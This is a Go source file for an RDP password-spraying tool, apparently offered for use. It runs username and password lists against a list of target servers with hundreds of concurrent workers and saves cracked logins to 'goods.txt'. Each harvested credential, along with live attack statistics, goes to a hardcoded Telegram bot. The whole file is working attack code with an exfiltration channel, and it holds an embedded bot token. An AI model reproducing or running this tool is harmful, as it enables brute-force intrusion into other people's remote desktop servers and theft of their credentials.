package main

import (
	"os"
	"log"
	"flag"
	"fmt"
	"math/rand"
        "sync/atomic"
	"sync"
	"strconv"
	"strings"
	"net/http"
	"net/url"
        "encoding/json"
	"time"
)

var restoreTask bool
var CONCURRENT_PER_WORKER int
var pathToUsernameList string
var usernameListRandomization bool
var pathToPasswordList string
var enableTelegram bool = true
var passwordListRandomization bool
var protocol string
var pathToTargetList string
var workersNumber int
var telegramMessageID int


var (
	stats struct {
		goods  int64
		errors int64
	}
	startTime    time.Time
	totalTargets int
	totalAttempts int
)

func appendToFile(data, filepath string) {
	file, err := os.OpenFile(filepath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		log.Printf("Failed to open file for append: %s", err)
		return
	}
	defer file.Close()

	if _, err := file.WriteString(data); err != nil {
		log.Printf("Failed to write to file: %s", err)
	}
}


func sendTelegramMessage(text string) {
    apiURL := "https://api.telegram.org/bot7662028089:AAEtFVCcc_ooHK5-_-Zl-3efP3gXGs-LoS8/sendMessage"
    params := url.Values{}
    params.Add("chat_id", strconv.FormatInt(6423543278, 10))
    params.Add("text", text)

    _, err := http.Get(apiURL + "?" + params.Encode())
    if err != nil {
        fmt.Println("Telegram error:", err)
    }
}


func printSuccessfulLogin(c chan string, ip string) {
    for credentials := range c {

        // Increase success counter
        atomic.AddInt64(&stats.goods, 1)

        // credentials format sent from rdpSpray: host:username:password
        parts := strings.Split(credentials, ":")
        if len(parts) < 3 {
            fmt.Println("Malformed credentials:", credentials)
            continue
        }

        serverInfo := struct {
            IP       string
            Port     string
            Username string
            Password string
        }{
            IP:       parts[0],
            Port:     "3389",        // Default RDP port, unless you later include port
            Username: parts[1],
            Password: parts[2],
        }

        // Compact success line
        successMessage := fmt.Sprintf("%s:%s@%s:%s",
            serverInfo.IP, serverInfo.Port,
            serverInfo.Username, serverInfo.Password,
        )

        // Save to goods.txt
        appendToFile(successMessage+"\n", "goods.txt")

        // Detailed multi-line report
        detailedInfo := fmt.Sprintf(`
=== 🎯 RDP Success 🎯 ===
🌐 Target: %s:%s
👤 User: %s
🔑 Password: %s
🕒 Timestamp: %s
🖥️ Server: %s
========================
`,
            serverInfo.IP,
            serverInfo.Port,
            serverInfo.Username,
            serverInfo.Password,
            time.Now().Format("2006-01-02 15:04:05"),
            ip,
        )

        // Save to detailed-results.txt
        appendToFile(detailedInfo, "detailed-results.txt")

        // Telegram alert
        sendTelegramMessage(detailedInfo)

        // Console output
        fmt.Printf("✅ SUCCESS: %s\n", successMessage)
    }
}


func formatTime(seconds float64) string {
	hours := int(seconds) / 3600
	minutes := (int(seconds) % 3600) / 60
	secs := int(seconds) % 60
	return fmt.Sprintf("%02d:%02d:%02d", hours, minutes, secs)
}

func printStats(forTelegram bool) string {
	goods := atomic.LoadInt64(&stats.goods)
	errors := atomic.LoadInt64(&stats.errors)
	
	totalConnections := int(goods + errors)
	elapsedTime := time.Since(startTime).Seconds()
	connectionsPerSecond := 0.0
	if elapsedTime > 0 {
		connectionsPerSecond = float64(totalConnections) / elapsedTime
	}
	
	estimatedRemainingTime := 0.0
	if connectionsPerSecond > 0 {
		estimatedRemainingTime = float64(totalAttempts-totalConnections) / connectionsPerSecond
	}

	// GET CONNECTION MONITORING DATA
	activeConns := globalMonitor.GetActiveCount()
	peakConns := atomic.LoadInt64(&globalMonitor.peakConnections)

	if forTelegram {
		var text strings.Builder
		text.WriteString("==============================\n")
		text.WriteString("🎯 RDP Spray Attack\n")
		text.WriteString("📁 Targets: " + strconv.Itoa(totalTargets) + " | 👥 Workers: " + strconv.Itoa(workersNumber) + "\n")
		text.WriteString("==============================\n")
		text.WriteString("🔍 Checked: " + strconv.Itoa(totalConnections) + "/" + strconv.Itoa(totalAttempts) + "\n")
		text.WriteString("⚡ Speed: " + fmt.Sprintf("%.2f", connectionsPerSecond) + " checks/sec\n")
		text.WriteString("🔗 Active Connections: " + strconv.FormatInt(activeConns, 10) + "\n")
		text.WriteString("📊 Peak Connections: " + strconv.FormatInt(peakConns, 10) + "\n")
		
		if totalConnections < totalAttempts {
			text.WriteString("⏳ Elapsed: " + formatTime(elapsedTime) + "\n")
			text.WriteString("⏰ Remaining: " + formatTime(estimatedRemainingTime) + "\n")
		} else {
			text.WriteString("⏳ Total Time: " + formatTime(elapsedTime) + "\n")
			text.WriteString("✅ Scan Completed Successfully!\n")
		}
		
		text.WriteString("==============================\n")
		text.WriteString("✅ Successful: " + strconv.FormatInt(goods, 10) + "\n")
		text.WriteString("❌ Failed: " + strconv.FormatInt(errors, 10) + "\n")
		
		if totalConnections > 0 {
			successRate := float64(goods) / float64(totalConnections) * 100
			text.WriteString("📊 Success Rate: " + fmt.Sprintf("%.2f", successRate) + "%\n")
		}
		
		text.WriteString("==============================\n")
		
		return text.String()
	} else {
		clear()
		fmt.Printf("================================================\n")
		fmt.Printf("🎯 RDP Spray Attack\n")
		fmt.Printf("📁 Targets: %d | 👥 Workers: %d\n", totalTargets, workersNumber)
		fmt.Printf("================================================\n")
		fmt.Printf("🔍 Checked: %d/%d\n", totalConnections, totalAttempts)
		fmt.Printf("⚡ Speed: %.2f checks/sec\n", connectionsPerSecond)
		fmt.Printf("🔗 Active Connections: %d\n", activeConns)
		fmt.Printf("📊 Peak Connections: %d\n", peakConns)
		
		// WARNING if too many connections
		if activeConns > 5000 {
			fmt.Printf("⚠️  WARNING: High connection count! System may throttle.\n")
		}
		
		if totalConnections < totalAttempts {
			fmt.Printf("⏳ Elapsed: %s\n", formatTime(elapsedTime))
			fmt.Printf("⏰ Remaining: %s\n", formatTime(estimatedRemainingTime))
		} else {
			fmt.Printf("⏳ Total Time: %s\n", formatTime(elapsedTime))
			fmt.Printf("✅ Scan Completed Successfully!\n")
		}
		
		fmt.Printf("================================================\n")
		fmt.Printf("✅ Successful: %d\n", goods)
		fmt.Printf("❌ Failed: %d\n", errors)
		
		if totalConnections > 0 {
			successRate := float64(goods) / float64(totalConnections) * 100
			fmt.Printf("📊 Success Rate: %.2f%%\n", successRate)
		}
		fmt.Printf("================================================\n")

		if totalConnections >= totalAttempts {
			fmt.Println("🎉 All tasks completed!")
		}
		
		return ""
	}
}

func sendInitialTelegramMessage(text string) {
    apiURL := "https://api.telegram.org/bot7662028089:AAEtFVCcc_ooHK5-_-Zl-3efP3gXGs-LoS8/sendMessage"
    params := url.Values{}
    params.Add("chat_id", strconv.FormatInt(6423543278, 10))
    params.Add("text", text)

    fullURL := fmt.Sprintf("%s?%s", apiURL, params.Encode())

    resp, err := http.Get(fullURL)
    if err != nil {
        fmt.Println("Telegram initial message error:", err)
        return
    }
    defer resp.Body.Close()

    // Decode JSON to get message_id
    type Response struct {
        OK     bool `json:"ok"`
        Result struct {
            MessageID int `json:"message_id"`
        } `json:"result"`
    }
    var result Response
    if err := json.NewDecoder(resp.Body).Decode(&result); err != nil {
        fmt.Println("Telegram decode error:", err)
        return
    }
    telegramMessageID = result.Result.MessageID
}


func editTelegramMessage(text string) {
    if telegramMessageID == 0 {
        return // message not sent yet
    }

    apiURL := "https://api.telegram.org/bot7662028089:AAEtFVCcc_ooHK5-_-Zl-3efP3gXGs-LoS8/editMessageText"
    params := url.Values{}
    params.Add("chat_id", strconv.FormatInt(6423543278, 10))
    params.Add("message_id", strconv.Itoa(telegramMessageID))
    params.Add("text", text)

    _, err := http.Get(apiURL + "?" + params.Encode())
    if err != nil {
        fmt.Println("Telegram edit error:", err)
    }
}


func statsMonitor() {
    consoleTicker := time.NewTicker(500 * time.Millisecond)
    teleTicker := time.NewTicker(60 * time.Second)
    defer consoleTicker.Stop()
    defer teleTicker.Stop()

    for {
        select {
        case <-consoleTicker.C:
            printStats(false)
        case <-teleTicker.C:
            if enableTelegram {
                editTelegramMessage(printStats(true))
            }
        }
    }
}


type runningTask struct {
	RandomSeed             int64
	UsersList              string
	PasswordsList          string
	ProtocolToSpray        string
	Targets                []string
	WorkersCount           int
	WorkersStates          []workerState
	UsernamesRandomization bool
	PasswordsRandomization bool
}

var currentTask runningTask

func init() {
	flag.BoolVar(&restoreTask, "restore", false, "Restore task")
	flag.StringVar(&pathToUsernameList, "ul", "usernames.txt", "Path to usernames list")
	flag.StringVar(&pathToPasswordList, "pl", "passwords.txt", "Path to passwords list")
	flag.BoolVar(&usernameListRandomization, "ru", false, "Randomize users list")
	flag.BoolVar(&passwordListRandomization, "rp", false, "Randomize passwords list")
	flag.StringVar(&protocol, "p", "rdp", "Protocol (rdp only)")
	flag.StringVar(&pathToTargetList, "tl", "targets.txt", "Path to targets list")
	flag.IntVar(&workersNumber, "w", 1500, "Number of Workers")
	flag.IntVar(&CONCURRENT_PER_WORKER, "c", 10, "Number Of Concurrent Workers")
	flag.Parse()
}

func main() {
	if restoreTask {
		err := readGob("./progress.gob", &currentTask)
		if err != nil {
			fmt.Printf("Error restoring task: %v\n", err)
			return
		}
		fmt.Println("✅ Task restored from progress.gob")
		
		// Calculate already processed attempts for stats
		var alreadyProcessed int64
		for i := range currentTask.WorkersStates {
			alreadyProcessed += int64(currentTask.WorkersStates[i].WorkerProgress)
		}
		
		// Set stats to reflect already completed work
		atomic.StoreInt64(&stats.errors, alreadyProcessed)
		
		fmt.Printf("📊 Resuming from %d already processed attempts\n", alreadyProcessed)
	} else {
		if usernameListRandomization || passwordListRandomization {
			currentTime := time.Now().UnixNano()
			currentTask.RandomSeed = currentTime
			currentTask.UsernamesRandomization = usernameListRandomization
			currentTask.PasswordsRandomization = passwordListRandomization
		} else {
			currentTask.RandomSeed = 0
			currentTask.PasswordsRandomization = false
			currentTask.UsernamesRandomization = false
		}

		currentTask.UsersList = pathToUsernameList
		currentTask.PasswordsList = pathToPasswordList
		currentTask.ProtocolToSpray = "rdp"
		currentTask.Targets = loadList(pathToTargetList)
		currentTask.WorkersCount = workersNumber

		currentTask.WorkersStates = make([]workerState, workersNumber)
		for i := 0; i < workersNumber; i++ {
			currentTask.WorkersStates[i] = workerState{
				WorkerId:       i + 1,
				WorkerProgress: 0,
			}
		}
		saveProgress()
	}

	usernames := loadList(currentTask.UsersList)
	passwords := loadList(currentTask.PasswordsList)

	if currentTask.UsernamesRandomization {
		r := rand.New(rand.NewSource(currentTask.RandomSeed))
		r.Shuffle(len(usernames), func(i, j int) { usernames[i], usernames[j] = usernames[j], usernames[i] })
	}
	if currentTask.PasswordsRandomization {
		r := rand.New(rand.NewSource(currentTask.RandomSeed))
		r.Shuffle(len(passwords), func(i, j int) { passwords[i], passwords[j] = passwords[j], passwords[i] })
	}

	wholeTask := task{
		targetsRaw:      currentTask.Targets,
		usernames:       usernames,
		passwords:       passwords,
		numberOfWorkers: currentTask.WorkersCount,
	}
	tasks := dispatchTask(wholeTask)

	var wg sync.WaitGroup
	channelForWorker := make(chan string, 100)
	ip, err := GetWANIP()
	if err != nil {
		ip = "127.0.0.1"
	}
	go printSuccessfulLogin(channelForWorker, ip)
	for i, task := range tasks {
		wg.Add(1)
		go rdpSpray(&wg, channelForWorker, task, &currentTask.WorkersStates[i].WorkerProgress)
	}

	startTime = time.Now() // FIX: set start time so elapsed is correct
	
	// totalTargets: number of unique targets loaded
	totalTargets = len(currentTask.Targets)
	
	// totalAttempts: conservative estimate = targets * usernames * passwords
	// Protect against zero-length username/password lists:
	usernameCount := len(usernames)
	passwordCount := len(passwords)
	if usernameCount == 0 || passwordCount == 0 || totalTargets == 0 {
	    totalAttempts = 0
	} else {
	    totalAttempts = totalTargets * usernameCount * passwordCount
	}

	go monitorCurrentTask()
	go statsMonitor() // This now uses the new ticker-based system
	if enableTelegram {
    		sendInitialTelegramMessage(printStats(true)) // send the first message
	}
	wg.Wait()
	close(channelForWorker)
	
	// Final stats
	printStats(false)
	if enableTelegram {
		editTelegramMessage(printStats(true))
	}
}
